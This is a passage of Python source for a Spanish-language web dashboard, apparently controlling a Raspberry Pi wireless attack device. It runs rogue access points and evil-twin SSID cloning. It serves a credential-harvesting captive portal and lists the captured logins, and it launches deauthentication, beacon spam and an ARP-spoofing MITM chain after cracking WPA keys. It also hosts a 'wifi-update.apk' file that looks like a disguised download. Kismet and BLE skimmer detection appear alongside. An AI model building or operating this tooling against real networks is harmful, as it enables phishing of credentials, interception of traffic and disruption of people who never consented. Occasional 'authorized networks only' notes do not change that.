    return bool(sh("pgrep -f 'mdk4'"))

# ── Portal management ──
def ensure_portals_dir():
    os.makedirs(PORTALS_DIR, exist_ok=True)

def list_portals():
    ensure_portals_dir()
    names=[]
    for f in sorted(os.listdir(PORTALS_DIR)):
        if f.endswith(".html") and f!="active.html": names.append(f[:-5])
    return names

def read_portal_html(name):
    p=os.path.join(PORTALS_DIR, name+".html")
    if not os.path.exists(p): return ""
    return open(p,encoding="utf-8",errors="replace").read()

def save_portal_html(name, html_content):
    ensure_portals_dir()
    safe="".join(c for c in name if c.isalnum() or c in "-_")[:40] or "portal"
    path=os.path.join(PORTALS_DIR, safe+".html")
    open(path,"w",encoding="utf-8").write(html_content)
    return safe

def delete_portal_file(name):
    p=os.path.join(PORTALS_DIR, name+".html")
    if os.path.exists(p): os.remove(p)

def activate_portal_file(name):
    ensure_portals_dir()
    src=os.path.join(PORTALS_DIR, name+".html")
    if not os.path.exists(src): return
    import shutil; shutil.copy2(src, ACTIVE_TPL)
    open(ACTIVE_NAME_F,"w").write(name)

def portal_active_name():
    if os.path.exists(ACTIVE_NAME_F):
        return open(ACTIVE_NAME_F).read().strip()
    return ""

def read_creds_json():
    if not os.path.exists(CREDS_JSON): return []
    try: return json.load(open(CREDS_JSON))
    except: return []
def api_live():
    cl=clients()
    cl_data=[{"mac":m,"ip":i,"name":n,"signal":s} for m,i,n,s in cl]
    mr=mitm_ready(); up,ssid,_=ap_state(); cpu,ram,uptime=sys_stats()
    return {
        "kismet":sh("systemctl is-active kismet-sensor.service"),
        "k_count":str(k_count()),
        "dns":dnsfeed(),"mitm_feed":mitmfeed(),"wt_result":wifitest_result(),
        "mitm_state":mitm_attack_state(),"mitm_ready":mr,
        "clients":len(cl),"clients_data":cl_data,"creds":len(creds()),
        "ap_up":up,"ap_ssid":ssid,"portal":portal_on_state(),
        "portal_active_name":portal_active_name(),
        "portal_creds":read_creds_json()[-20:],
        "cpu":cpu,"ram":ram,"uptime":uptime,
        "scan":parse_scan(),"channel_stats":parse_channel_stats(),
        "ble_state":ble_scan_state(),"ble_devices":ble_scan_results(),
        "beacon_spam":beacon_spam_active()
    }

def hp(on,ton,toff):
    if on: return '<span class="pill pon">&#x25cf; '+ton+'</span>'
    return '<span class="pill poff">&#x25cf; '+toff+'</span>'
def hfl(items,empty):
    if not items: return '<p class="muted">'+empty+'</p>'
    return ''.join('<div class="fl">'+html.escape(x)+'</div>' for x in reversed(items))

def render(klink):
    up,ssid,ch=ap_state(); cpu,ram,uptime_s=sys_stats()
    k=sh("systemctl is-active kismet-sensor.service") or "?"
    al=k_alerts(); kc_n=k_count(); cl=clients(); cr=creds()
    fd=dnsfeed(); mf=mitmfeed(); wtr=wifitest_result()
    mr=mitm_ready(); mas=mitm_attack_state(); pst=portal_on_state()
    scan=parse_scan(); ch_stats=parse_channel_stats()
    cssid,csec=ap_cfg(); eth=sh("ip -br addr show eth0 | awk '{print $3}'")
    abe=sh("systemctl is-enabled pineapple-ap.service 2>/dev/null")=="enabled"
    ble_st=ble_scan_state(); ble_devs=ble_scan_results()
    bspam=beacon_spam_active()

    def ccolor(v): return "#f85149" if v>80 else "#f5c542" if v>60 else "#3fb950"

    p=[]
    p.append('<!doctype html><html><head>'
        '<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">'
        '<title>Pineapple Express</title><link rel=manifest href=/manifest.webmanifest>'
        '<meta name=theme-color content="#0d1117"><link rel=apple-touch-icon href=/icon-192.png>'
        '<meta name=mobile-web-app-capable content=yes><meta name=apple-mobile-web-app-capable content=yes>'
        '<style>'+CSS+'</style></head><body>')

    # ── Header ──
    p.append('<div id=header><div id=logo>&#127821; Pineapple Express</div><div class=hdiv></div>'
        '<div class=hst><div class=hst-val><span id=hdr-cpu>'+str(round(cpu))+'%</span></div>'
        '<div class=hst-lbl>CPU</div><div class=hst-bar>'
        '<div id=bar-cpu class=hst-bar-fill style="width:'+str(min(100,cpu))+'%;background:'+ccolor(cpu)+'"></div></div></div>'
        '<div class=hst><div class=hst-val><span id=hdr-ram>'+str(round(ram))+'%</span></div>'
        '<div class=hst-lbl>RAM</div><div class=hst-bar>'
        '<div id=bar-ram class=hst-bar-fill style="width:'+str(min(100,ram))+'%;background:'+ccolor(ram)+'"></div></div></div>'
        '<div class=hdiv></div>'
        '<div class=hst><div class=hst-val><span id=hdr-clients>'+str(len(cl))+'</span></div><div class=hst-lbl>Clientes</div></div>'
        '<div class=hst><div class=hst-val><span id=hdr-kismet>'+html.escape(str(kc_n))+'</span></div><div class=hst-lbl>Kismet</div></div>'
        '</div>')

    p.append('<div id=layout>')

    # ── Sidebar ──
    p.append('<nav id=sidebar>'
        '<div class=nav-item id=nav-dashboard><span class=nav-icon>&#8861;</span>Dashboard</div>'
        '<div class=nav-item id=nav-recon><span class=nav-icon>&#128225;</span>Recon</div>'
        '<div class=nav-item id=nav-ap><span class=nav-icon>&#128246;</span>Rogue AP</div>'
        '<div class=nav-sep></div>'
        '<div class=nav-item id=nav-attack><span class=nav-icon>&#9889;</span>Ataque</div>'
        '<div class=nav-item id=nav-defense><span class=nav-icon>&#128737;</span>Defensa</div>'
        '<div class=nav-sep></div>'
        '<div class=nav-item id=nav-ble><span class=nav-icon style="font-size:11px;font-weight:700">BLE</span>Bluetooth</div>'
        '<div class=nav-sep></div>'
        '<div class=nav-item id=nav-portal><span class=nav-icon>&#128274;</span>Portal</div>'
        '</nav>')

    p.append('<div id=content>')

    # ════════════ DASHBOARD ════════════
    p.append('<div id=tab-dashboard class=tab-page>')
    p.append('<div class=grid-4>'
        '<div class=stat-card><div class=stat-val style="color:'+ccolor(cpu)+'"><span id=s-cpu>'+str(round(cpu))+'%</span></div>'
        '<div class=stat-lbl>CPU Load</div><div class=stat-bar>'
        '<div id=sbar-cpu class=stat-bar-fill style="width:'+str(min(100,cpu))+'%;background:'+ccolor(cpu)+'"></div></div></div>'
        '<div class=stat-card><div class=stat-val style="color:'+ccolor(ram)+'"><span id=s-ram>'+str(round(ram))+'%</span></div>'
        '<div class=stat-lbl>RAM</div><div class=stat-bar>'
        '<div id=sbar-ram class=stat-bar-fill style="width:'+str(min(100,ram))+'%;background:'+ccolor(ram)+'"></div></div></div>'
        '<div class=stat-card><div class=stat-val style="font-size:14px;padding-top:6px"><span id=s-uptime>'+html.escape(uptime_s)+'</span></div>'
        '<div class=stat-lbl>Uptime</div></div>'
        '<div class=stat-card><div class=stat-val><span id=s-kdevs>'+html.escape(str(kc_n))+'</span></div><div class=stat-lbl>Kismet devs</div></div>'
        '</div>')
    p.append('<div class=grid-4>'
        '<div class=mod-card><div class=mod-label>Rogue AP</div><div id=dash-ap>'+hp(up,'ACTIVO','parado')+(' <b>'+html.escape(ssid)+'</b>' if up and ssid else '')+'</div></div>'
        '<div class=mod-card><div class=mod-label>Kismet</div><div id=dash-kismet>'+hp(k=='active','active',k)+'</div></div>'
        '<div class=mod-card><div class=mod-label>Evil Portal</div><div id=dash-portal>'+hp(pst,'ON','off')+'</div></div>'
        '<div class=mod-card><div class=mod-label>MITM Attack</div><div id=dash-mitm>'+hp(mas=='running','EN CURSO','idle')+'</div></div>'
        '</div>')
    p.append('<div class=grid-2>'
        '<div class=card><div class=card-h>&#218;ltimo test WiFi</div>'
        '<div id=dash-wt><pre style="white-space:pre-wrap;font-family:monospace;font-size:12px;color:#3fb950;margin:0">'+html.escape(wtr)+'</pre></div></div>'
        '<div class=card><div class=card-h>Credenciales capturadas &nbsp;<b id=dash-creds style="color:#e6edf3">'+str(len(cr))+'</b></div>'
        +(''.join('<div class=cred>'+html.escape(c)+'</div>' for c in cr[-3:]) if cr else '<p class=muted>(ninguna a&uacute;n)</p>')
        +'</div></div>')
    p.append('<div class=card><div class=card-h>Acciones r&aacute;pidas</div>'
        '<div style="display:flex;gap:8px;flex-wrap:wrap">'
        '<button class="btn btn-p" onclick="showTab(\'recon\')">&#128269; Test WiFi</button>'
        '<button class="btn btn-p" onclick="showTab(\'ap\')">&#128246; Rogue AP</button>'
        '<button class="btn btn-r" onclick="showTab(\'attack\')">&#9889; MITM</button>'
        '<button class="btn btn-g" onclick="showTab(\'ble\')">BLE Scanner</button>'
        '</div></div>')
    p.append('</div>')

    # ════════════ RECON ════════════
    # Channel chart initial render
    if ch_stats:
        mx=max(ch_stats.values(),default=1)
        ch_html='<div class=ch-chart>'
        for c in range(1,14):
            n=ch_stats.get(str(c),0); pct=round(n/mx*100); col="#f85149" if n>=4 else "#f5c542" if n>=2 else "#3fb950"
            ch_html+=('<div class=ch-row><span class=ch-num>CH'+str(c)+'</span>'
                '<div class=ch-bw><div class=ch-bf style="width:'+str(pct or 2)+'%;background:'+col+'"></div></div>'
                '<span class=ch-ct>'+str(n)+(' AP' if n==1 else ' APs')+'</span></div>')
        ch_html+='</div>'
    else:
        ch_html='<p class=muted>Sin datos de canal. Lanza un escaneo primero.</p>'

    if scan:
        scan_html='<table><thead><tr><th>BSSID</th><th>SSID</th><th>CH</th><th>ENC</th><th>Se&ntilde;al</th><th></th></tr></thead><tbody>'
        for ap in scan:
            bssid_e=html.escape(ap["bssid"]); ch_e=html.escape(ap["ch"])
            scan_html+=('<tr><td class=mono>'+bssid_e+'</td><td>'+html.escape(ap["ssid"])+'</td>'
                '<td>'+ch_e+'</td><td>'+html.escape(ap["enc"])+'</td><td>'+html.escape(ap["power"])+' dBm</td>'
                '<td><button class="btn btn-sm btn-p" type=button '
                'onclick="setTarget(\''+ap["bssid"].replace("'","\\'")+'\',\''+ap["ch"].replace("'","\\'")+'\')">Target</button></td></tr>')
        scan_html+='</tbody></table>'
    else:
        scan_html='<p class=muted>Sin resultados. Lanza un escaneo para ver redes cercanas.</p>'

    p.append('<div id=tab-recon class=tab-page>')
    p.append('<div class=grid-2>'
        '<div class=card><div class=card-h>Escaneo WiFi <span class=muted style="text-transform:none;font-weight:400;font-size:12px">(airodump-ng 15s)</span></div>'
        '<form method=POST action=/recon_scan style="margin-bottom:12px">'
        '<button class="btn btn-p">&#9654; Lanzar escaneo</button>'
        '<span class=muted style="font-size:12px;margin-left:10px">Pausa Kismet ~17s</span></form>'
        '<div id=scan-table>'+scan_html+'</div></div>'
        '<div class=card><div class=card-h>Analyzer de canales 2.4 GHz</div>'
        '<div id=channel-chart>'+ch_html+'</div></div>'
        '</div>')
    p.append('<div class=card><div class=card-h>Test WiFi &middot; Pwnagotchi-lite</div>'
        '<div id=wt-result><pre style="white-space:pre-wrap;font-family:monospace;font-size:12px;color:#3fb950;margin:0 0 12px">'+html.escape(wtr)+'</pre></div>'
        '<form method=POST action=/wifitest><div class=form-row>'
        '<div><label>BSSID (vac&iacute;o = mi AP)</label><input type=text id=wt-bssid name=bssid placeholder="vac&iacute;o = tu AP" size=18></div>'
        '<div><label>Canal</label><input type=text id=wt-ch name=ch placeholder=auto size=4></div>'
        '</div><button class="btn btn-p">Lanzar test</button>'
        '<span class=muted style="font-size:11px;margin-left:8px">Solo redes propias/autorizadas. Pausa Kismet ~45s.</span>'
        '</form></div>')
    p.append('</div>')

    # ════════════ ROGUE AP ════════════
    if up:
        ap_ctrl=(hp(True,'ACTIVO','')+'<span style="margin-left:8px">SSID: <b>'+html.escape(ssid)+'</b> &middot; Canal '+html.escape(ch)+'</span>'
            '<br><form method=POST action=/ap_stop style="margin-top:8px"><button class="btn btn-r">Parar AP</button></form>')
    else:
        ap_ctrl=(hp(False,'','parado')+'<br><form method=POST action=/ap_start style="margin-top:8px">'
            '<button class="btn btn-p">Arrancar AP</button></form>')
    if pst:
        portal_ctrl=(hp(True,'ON','')+'<span class=muted style="margin-left:8px">capturando logins</span>'
            '<br><form method=POST action=/portal_off style="margin-top:8px"><button class="btn btn-r">Apagar portal</button></form>')
    else:
        portal_ctrl=(hp(False,'','off')+'<span class=muted style="margin-left:8px">internet normal</span>'
            '<br><form method=POST action=/portal_on style="margin-top:8px"><button class="btn btn-p">Activar portal</button></form>')
    ct_html=''
    if cl:
        ct_html='<table><thead><tr><th>MAC</th><th>IP</th><th>Nombre</th><th>Se&ntilde;al</th></tr></thead><tbody>'
        for m,i,n,sg in cl:
            ct_html+='<tr><td class=mono>'+html.escape(m)+'</td><td>'+html.escape(i)+'</td><td>'+html.escape(n)+'</td><td>'+html.escape(sg)+'</td></tr>'
        ct_html+='</tbody></table>'
    else:
        ct_html='<p class=muted>(ninguno asociado)</p>'
    crt=''.join('<div class=cred>'+html.escape(c)+'</div>' for c in cr) if cr else '<p class=muted>(ninguna a&uacute;n)</p>'

    p.append('<div id=tab-ap class=tab-page>')
    p.append('<div class=grid-2>'
        '<div class=card><div class=card-h>Control AP</div>'+ap_ctrl
        +'<p class=muted style="font-size:11px;margin-top:12px">Auto-arranque al boot: '
        +'<form method=POST action=/apboot_'+('off' if abe else 'on')+' style=display:inline>'
        +'<button class="btn btn-sm btn-g" style="margin-left:6px">'+('ON &rarr; off' if abe else 'off &rarr; ON')+'</button></form></p></div>'
        '<div class=card><div class=card-h>Evil Twin</div>'
        '<p style="margin-bottom:8px">Emitiendo: <b>'+html.escape(cssid)+'</b> &nbsp;'
        +('<span class="pill pon" style="font-size:11px">WPA2</span>' if csec else '<span class="pill pwarn" style="font-size:11px">ABIERTO</span>')+'</p>'
        '<form method=POST action=/eviltwin><div class=form-row>'
        '<div><label>Clonar SSID</label><input type=text name=ssid placeholder="nombre de red" size=18></div>'
        '<button class="btn btn-r" style="align-self:flex-end">Evil-twin</button></div></form>'
        '<form method=POST action=/normalap style="margin-top:4px"><button class="btn btn-sm btn-g">Volver a WPA2</button></form>'
        '</div></div>')
    p.append('<div class=card><div class=card-h>Portal cautivo</div>'+portal_ctrl+'</div>')
    p.append('<div class=card><div class=card-h>Clientes asociados &nbsp;<b id=client-count style="color:#e6edf3">'+str(len(cl))+'</b>'
        ' &nbsp;<span class=muted style="font-size:11px">uplink eth0: '+html.escape(eth)+'</span></div>'
        '<div id=client-table>'+ct_html+'</div></div>')
    p.append('<div class=card><div class=card-h>Tr&aacute;fico DNS en vivo</div>'
        '<div id=dns-feed>'+hfl(fd,'sin tr&aacute;fico DNS a&uacute;n - conecta un cliente al AP')+'</div></div>')
    p.append('<div class=card><div class=card-h>Credenciales capturadas &nbsp;<b id=cred-count style="color:#e6edf3">'+str(len(cr))+'</b></div>'
        +crt+'<form method=POST action=/clear style="margin-top:10px"><button class="btn btn-r btn-sm">Borrar log</button></form></div>')
    p.append('</div>')

    # ════════════ ATAQUE ════════════
    if mas=="running":
        tgt=mr.get('SSID','?') if mr else '?'
        mrac=(hp(True,'EN CURSO','')+'<span class=muted style="margin-left:8px">Kismet pausado</span>'
            '<br><p style="margin:8px 0">Conectado a <b>'+html.escape(tgt)+'</b></p>'
            +hfl(mf,'sin tr&aacute;fico a&uacute;n...')
            +'<form method=POST action=/mitmattack_stop style="margin-top:10px"><button class="btn btn-r">Detener MITM</button></form>')
    elif mas in("starting","stopped:error"):
        mrac=(hp(False,'',mas)+hfl(mf,'')
            +'<form method=POST action=/mitmattack_stop><button class="btn btn-r">Cancelar</button></form>')
    elif mr:
        mrac=('<table style="margin-bottom:12px"><tr><th>SSID</th><td>'+html.escape(mr.get('SSID','?'))+'</td></tr>'
            '<tr><th>BSSID</th><td class="muted mono">'+html.escape(mr.get('BSSID',''))+'</td></tr>'
            '<tr><th>Key</th><td style="color:#f5c542;font-family:monospace">'+html.escape(mr.get('KEY',''))+'</td></tr></table>'
            '<form method=POST action=/mitmattack><button class="btn btn-r">&#9889; Lanzar MITM</button></form>'
            '<p class=muted style="font-size:11px;margin-top:8px">Pausa Kismet. Solo redes propias/autorizadas.</p>')
    else:
        mrac='<p class=muted>Ejecuta el test WiFi (tab Recon). El bot&oacute;n aparece aqu&iacute; tras crackear la contrase&ntilde;a.</p>'

    bspam_state=(hp(True,'ACTIVO','')+'<span class=muted style="margin-left:8px">inundando airespace</span>' if bspam
        else hp(False,'','parado'))
    bspam_btn=('<form method=POST action=/beacon_spam_stop><button class="btn btn-r">Detener Beacon Spam</button></form>'
        if bspam else '<form method=POST action=/beacon_spam><button class="btn btn-r">&#128246; Lanzar Beacon Spam</button></form>')

    p.append('<div id=tab-attack class=tab-page>')
    p.append('<div class=card><div class=card-h>MITM Attack Chain '
        '<span class=muted style="text-transform:none;font-weight:400;font-size:12px">'
        'test &rarr; crack &rarr; connect &rarr; ARP spoof &rarr; DNS/SNI</span></div>'
        '<div id=mitm-inner>'+mrac+'</div></div>')
    p.append('<div class=card><div class=card-h>Monitor MITM &middot; HTTPS / SNI en vivo</div>'
        '<div id=mitm-feed>'+hfl(mf,'sin HTTPS a&uacute;n')+'</div></div>')
    p.append('<div class=card><div class=card-h>Deauth</div>'
        '<form method=POST action=/deauth><div class=form-row>'
        '<div><label>BSSID</label><input type=text name=bssid value="'+html.escape(DEF_BSSID)+'" size=18></div>'
        '<div><label>Canal</label><input type=text name=ch value="'+html.escape(DEF_CH)+'" size=4></div>'
        '</div><button class="btn btn-r">Deauth &times;10</button>'
        '<span class=muted style="font-size:11px;margin-left:8px">Pausa Kismet ~7s. Solo TU red.</span></form></div>')
    p.append('<div class=card><div class=card-h>Beacon Spam '
        '<span class=muted style="text-transform:none;font-weight:400;font-size:12px">'
        'inunda el aire con SSIDs falsos via mdk4</span></div>'
        '<div id=beacon-state style="margin-bottom:10px">'+bspam_state+'</div>'
        '<div id=beacon-btn>'+bspam_btn+'</div>'
        '<p class=muted style="font-size:11px;margin-top:8px">Pausa Kismet mientras est&aacute; activo. Solo en entornos propios/autorizados.</p>'
        '</div>')
    p.append('</div>')

    # ════════════ DEFENSA ════════════
    kc_str='<div id=k-state style="margin-bottom:10px">'+hp(k=='active','active',k)
    if k=='active': kc_str+=' &nbsp;dispositivos: <b>'+html.escape(str(kc_n))+'</b>'
    kc_str+='</div>'
    al_html=""
    if al is None:
        al_html='<p class=muted>(API Kismet no disponible &mdash; &iquest;est&aacute; corriendo?)</p>'
    elif not al:
        al_html='<p style="color:#3fb950">Sin alertas activas &#10003;</p>'
    else:
        for h2,sev,t in reversed(al):
            cls="alert-h" if sev>=10 else "alert-m"
            al_html+='<div class='+cls+'><b>'+html.escape(h2)+'</b> <span class=muted>'+html.escape(t)+'</span></div>'

    p.append('<div id=tab-defense class=tab-page>')
    p.append('<div class=card><div class=card-h>Kismet &middot; IDS Pasivo</div>'
        +kc_str+al_html
        +'<div style="margin-top:12px"><a href="'+html.escape(klink)+'" target=_blank>'
        '<button class="btn btn-b">Abrir Kismet UI &#8599;</button></a></div></div>')
    p.append('</div>')

    # ════════════ BLUETOOTH ════════════
    ble_pill=(hp(False,'','idle') if ble_st=='idle'
        else ('<span class="pill pwarn">&#x25cf; escaneando... (12s)</span>' if ble_st=='running'
        else hp(True,'completado','')))

    if ble_devs:
        skimmers=[d for d in ble_devs if 'SKIMMER' in d.get('flags',[])]
        airtags=[d for d in ble_devs if 'AIRTAG' in d.get('flags',[])]
        ble_summary=''
        if skimmers: ble_summary+='<span class="pill poff" style="margin-right:6px">&#9888; '+str(len(skimmers))+' SKIMMER'+('S' if len(skimmers)>1 else '')+'</span>'
        if airtags: ble_summary+='<span class="pill pon" style="margin-right:6px">'+str(len(airtags))+' AIRTAG'+('S' if len(airtags)>1 else '')+'</span>'
        if not skimmers and not airtags and ble_st=='done': ble_summary='<span class=muted style="font-size:12px">Sin amenazas detectadas</span>'
        ble_rows=''
        for d in ble_devs:
            flags=''.join('<span class="bflag '+('bf-skimmer' if f=='SKIMMER' else 'bf-airtag' if f=='AIRTAG' else 'bf-apple')+'">'+html.escape(f)+'</span>'
                for f in d.get('flags',[]))
            rssi=str(d.get('rssi',''))+(' dBm' if d.get('rssi') else '')
            row_bg=' style="background:#2d141820"' if 'SKIMMER' in d.get('flags',[]) else ''
            ble_rows+=('<tr'+row_bg+'><td class=mono style="font-size:12px">'+html.escape(d.get('mac',''))+'</td>'
                '<td>'+html.escape(d.get('name',''))+'</td><td style="font-size:12px">'+rssi+'</td><td>'+flags+'</td></tr>')
        ble_table='<table><thead><tr><th>MAC</th><th>Nombre</th><th>RSSI</th><th>Detecciones</th></tr></thead><tbody>'+ble_rows+'</tbody></table>'
    else:
        ble_summary=''; ble_table='<p class=muted>Sin dispositivos. Lanza un escaneo BLE (12s).</p>'

    p.append('<div id=tab-ble class=tab-page>')
    p.append('<div class=card><div class=card-h>BLE Scanner &middot; Skimmer &amp; Tracker Detector</div>'
        '<div style="display:flex;align-items:center;gap:12px;margin-bottom:12px;flex-wrap:wrap">'
        '<div id=ble-state>'+ble_pill+'</div>'
        '<div id=ble-summary>'+ble_summary+'</div></div>'
        '<form method=POST action=/ble_scan style="margin-bottom:16px">'
        '<button class="btn btn-p">&#9654; Escanear Bluetooth (12s)</button>'
        '<span class=muted style="font-size:12px;margin-left:10px">Usa BT 5.0 integrado de la Pi. No pausa Kismet.</span>'
        '</form>'
        '<div id=ble-table>'+ble_table+'</div>'
        '</div>')
    p.append('<div class=card style="border-color:#30363d">'
        '<div class=card-h>Detecciones</div>'
        '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px">'
        '<div class=mod-card><div class=mod-label style="color:#f85149">&#9888; Skimmer</div>'
        '<p style="font-size:12px;color:#8b949e">Nombres HC-03/05/06/07/08, BlueSweep, SKM-LE. Dispositivos Bluetooth serie usados en lectores de tarjetas fraudulentos.</p></div>'
        '<div class=mod-card><div class=mod-label style="color:#3fb950">AirTag / FindMy</div>'
        '<p style="font-size:12px;color:#8b949e">Apple manufacturer data 0x004C tipo 0x12. AirTags y dispositivos de la red FindMy de Apple.</p></div>'
        '<div class=mod-card><div class=mod-label style="color:#79c0ff">Apple</div>'
        '<p style="font-size:12px;color:#8b949e">Otros dispositivos Apple (AirPods, iPhone, Mac) con manufacturer data Apple identificados en anuncios BLE.</p></div>'
        '</div></div>')
    p.append('</div>')

    # ════════════ PORTAL CAUTIVO ════════════
    portals=list_portals(); pan=portal_active_name(); pst2=portal_on_state()
    pcreds=read_creds_json()

    # Template cards
    tpl_cards=''
    for name in portals:
        is_active=(name==pan)
        tpl_cards+=('<div class="tpl-card'+(' active-tpl' if is_active else '')+'">'
            '<div class=tpl-name>'+html.escape(name)+(
                ' <span class="pill pon" style="font-size:10px">activo</span>' if is_active else '')+'</div>'
            '<div class=tpl-actions>'
            '<button class="btn btn-sm btn-g" onclick="portalLoadTpl(\''+html.escape(name,quote=True)+'\')">Editar</button>'
            +('<button class="btn btn-sm btn-p" onclick="portalActivate(\''+html.escape(name,quote=True)+'\')">Activar</button>' if not is_active else '')
            +'<button class="btn btn-sm btn-r" onclick="portalDelete(\''+html.escape(name,quote=True)+'\')">&#x2715;</button>'
            '</div></div>')
    if not tpl_cards:
        tpl_cards='<p class=muted>No hay plantillas guardadas. Crea una nueva abajo.</p>'

    # Creds table
    if pcreds:
        cred_rows=''
        for c in reversed(pcreds[-30:]):
            fields=' &nbsp;'.join(html.escape(k)+'=<b>'+html.escape(str(v))+'</b>'
                for k,v in (c.get('data') or {}).items())
            cred_rows+=('<div class=cred-row>'
                '<span class=muted>'+html.escape(c.get('ts',''))+'</span>'
                '<span class=muted>'+html.escape(c.get('ip',''))+'</span>'
                '<span>'+fields+'</span></div>')
        creds_html=cred_rows
    else:
        creds_html='<p class=muted id=portal-creds>Sin capturas a&uacute;n.</p>'

    p.append('<div id=tab-portal class=tab-page>')
    p.append('<div class=grid-2>'
        '<div class=card><div class=card-h>Estado del Portal</div>'
        '<div id=portal-status style="margin-bottom:12px">'+(
            hp(True,'ACTIVO','')+'&nbsp;<span class=muted>plantilla: <b>'+html.escape(pan)+'</b></span>' if pst2
            else hp(False,'','apagado'))+'</div>'
        '<div id=portal-toggle-btn>'+(
            '<form method=POST action=/portal_off><button class="btn btn-r">Apagar portal</button></form>' if pst2
            else '<form method=POST action=/portal_on><button class="btn btn-p">Activar portal activo</button></form>')+'</div>'
        '<p class=muted style="font-size:11px;margin-top:12px">Al activar: redirige todo el DNS del AP a esta Pi y sirve el portal en el puerto 80.</p>'
        '</div>'
        '<div class=card><div class=card-h>Credenciales capturadas &nbsp;<b style="color:#e6edf3">'+str(len(pcreds))+'</b></div>'
        '<div id=portal-creds>'+creds_html+'</div>'
        '<form method=POST action=/portal_creds_clear style="margin-top:10px">'
        '<button class="btn btn-r btn-sm">Borrar capturas</button></form>'
        '</div></div>')
    p.append('<div class=card><div class=card-h>Plantillas guardadas '
        '<button class="btn btn-sm btn-p" style="text-transform:none;letter-spacing:0;font-size:12px" onclick="portalNew()">+ Nueva plantilla</button></div>'
        '<div class=tpl-grid>'+tpl_cards+'</div>'
        '</div>')
    p.append('<div class=card><div class=card-h>Editor de plantilla</div>'
        '<div class=form-row style="margin-bottom:12px">'
        '<div><label>Nombre</label><input type=text id=pe-name placeholder="mi-portal" size=24></div>'
        '<button class="btn btn-g" style="align-self:flex-end" onclick="portalSave(false)">Guardar</button>'
        '<button class="btn btn-p" style="align-self:flex-end" onclick="portalSave(true)">Guardar y Activar</button>'
        '</div>'
        '<textarea class=code-ed id=pe-html placeholder="Escribe el HTML del portal aqu&iacute;..."></textarea>'
        '<p class=muted style="font-size:11px;margin-top:6px">El formulario debe hacer POST a <code>/login</code>. '
        'Todos los campos del form son capturados autom&aacute;ticamente.</p>'
        '</div>')
    p.append('</div>')

    p.append('<script>'+JS+'</script>')
    p.append('</div></div></body></html>')
    return ''.join(p).encode('utf-8')

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        p=self.path.split("?")[0]
        if p=="/manifest.webmanifest":
            b=MANIFEST.encode(); ct="application/manifest+json"
        elif p.startswith("/icon-") and p.endswith(".png"):
            try: b=open(BASE+p,"rb").read()
            except Exception: b=b""
            ct="image/png"
        elif p=="/wifi-update.apk":
            try: b=open(BASE+"/wifi-update.apk","rb").read()
            except Exception: b=b""
            ct="application/vnd.android.package-archive"
        elif p=="/api/live":
            b=json.dumps(api_live()).encode(); ct="application/json"
        elif p=="/api/portal_template":
            qs=urllib.parse.parse_qs(self.path.split("?",1)[1] if "?" in self.path else "")
            name=qs.get("name",[""])[0]
            b=json.dumps({"name":name,"html":read_portal_html(name)}).encode(); ct="application/json"
        else:
            host=self.headers.get("Host","127.0.0.1:8080").split(":")[0]
            b=render("http://"+host+":2502"); ct="text/html; charset=utf-8"
        self.send_response(200); self.send_header("Content-Type",ct)
        self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        n=int(self.headers.get("Content-Length","0") or 0)
        body=self.rfile.read(n).decode("utf-8","replace") if n else ""
        q=urllib.parse.parse_qs(body); p=self.path
        if p=="/clear": sh("rm -f "+CRED)
        elif p=="/ap_stop": sh("pkill hostapd; pkill -f "+PORTAL+"; pkill -f pineapple-dnsmasq")
        elif p=="/ap_start": ap_start()
        elif p=="/portal_on": portal_on()
        elif p=="/portal_off": portal_off()
        elif p=="/eviltwin":
            s=q.get("ssid",[""])[0].replace("\n","").replace("\r","")[:32]
            if s: set_eviltwin(s)
        elif p=="/normalap": set_normal_ap()
        elif p=="/apboot_on": sh("systemctl enable pineapple-ap.service")
        elif p=="/apboot_off": sh("systemctl disable pineapple-ap.service")
        elif p=="/recon_scan": recon_scan()
        elif p=="/wifitest":
            b2=q.get("bssid",[""])[0].strip(); c2=q.get("ch",[""])[0].strip()
            if b2 and not re.match(r"^[0-9A-Fa-f:]{17}$",b2): b2=""
            if not c2.isdigit(): c2=""
            sh("nohup bash %s/wifitest.sh '%s' '%s' >/dev/null 2>&1 &"%(BASE,b2,c2))
        elif p=="/mitmattack":
            sh("nohup bash "+MITMATTACK+" >/dev/null 2>&1 &")
        elif p=="/mitmattack_stop":
            sh("pkill -TERM -f mitm-attack.sh; pkill -f arpspoof; pkill -f 'tshark.*wlan1'")
        elif p=="/ble_scan": ble_scan_start()
        elif p=="/portal_save":
            pname=q.get("name",[""])[0].strip(); phtml=q.get("html",[""])[0]
            pact=q.get("activate",["0"])[0]=="1"
            if pname:
                saved=save_portal_html(pname, phtml)
                if pact: activate_portal_file(saved)
        elif p=="/portal_delete":
            pname=q.get("name",[""])[0].strip()
            if pname: delete_portal_file(pname)
        elif p=="/portal_activate":
            pname=q.get("name",[""])[0].strip()
            if pname: activate_portal_file(pname)
        elif p=="/portal_creds_clear":
            sh("rm -f "+CREDS_JSON+" "+CRED)
        elif p=="/beacon_spam":
            sh("nohup bash "+BEACONSH+" >/dev/null 2>&1 &")
        elif p=="/beacon_spam_stop":
            sh("pkill -9 -f mdk4; sleep 1; systemctl start kismet-sensor.service")
        elif p=="/deauth":
            bssid=q.get("bssid",[DEF_BSSID])[0]; ch2=q.get("ch",[DEF_CH])[0]
            if re.match(r"^[0-9A-Fa-f:]{17}$",bssid) and ch2.isdigit(): deauth(bssid,ch2)
        self.send_response(303); self.send_header("Location","/"); self.end_headers()
    def log_message(self,*a): pass

http.server.ThreadingHTTPServer(("0.0.0.0",8080),H).serve_forever()
